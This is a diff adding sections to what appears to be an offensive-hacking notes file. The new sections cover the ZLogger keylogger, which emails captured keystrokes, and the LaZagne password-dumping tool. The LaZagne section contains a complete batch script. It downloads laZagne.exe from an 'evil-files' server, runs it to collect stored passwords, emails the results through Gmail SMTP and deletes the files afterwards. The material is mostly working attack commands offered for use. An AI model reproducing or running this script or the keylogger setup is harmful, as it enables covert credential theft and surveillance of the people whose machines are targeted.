@@ -444,6 +444,65 @@ Installation:
 ```
 python trojan_factory.py -f (Front file url) -e (evil file url) -o (export path) -i (icon)
 ```
+## ZLogger (keyloger)
+the keyloggers that come with 'Empire' and with 'Meterpreter' store the data on file,
+they store the data on the computer.
+Also, for you to be able to read this data,
+you'll need to come back after a while and connect to this computer through your back door
+and then read the data that these keyloggers have gathered.
+
+Whereas when it comes to the keylogger that we're gonna have a look on now,
+it'll actually run in the background and send the data to you through your email.
+- https://github.com/z00z/ZLogger
+```
+git clone https://github.com/z00z/ZLogger
+cd ZLogger
+bash install.sh
+python zlogger.py --help
+python zlogger.py -i 60 -w -e email@gmail.com -p PASSWORD123 -o filename
+* on the email enable less secure app access
+```
+The generated file is in opt/ZLogger/dist
+
+## LaZagne (retrieve lots of passwords stored on a local computer)
+- https://github.com/AlessandroZ/LaZagne
+1. Option direct download
+- https://github.com/AlessandroZ/LaZagne/releases/
+```
+laZagne.exe all 
+laZagne.exe all -oN filename
+``````
+2. Send it and resive results in Mail
+Dowload the compiled reles and open a server so it can be open directly add permitions to avoid error
+```
+chmod 777 laZagne.exe
+```
+Add the link, email and password * on the email enable less secure app access  
+create this .bat file  
+```
+@echo off
+
+set downloadURL=http://10.20.14.213/evil-files/laZagne.exe
+set email=email@gmail.com
+set password=PASSWORD
+
+set exeFile=%TEMP%\proc.exe
+set logFile=%TEMP%\proclog.txt
+set arguments=all
+
+
+powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');
+%exeFile% %arguments% > %logFile%
+
+del %exeFile%
+
+powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);
+
+del %logFile%
+```
+
+3. Is includet in Pupy Rat
+- https://github.com/n1nj4sec/pupy
 
 ## Fake Update
 If the updates are coming from
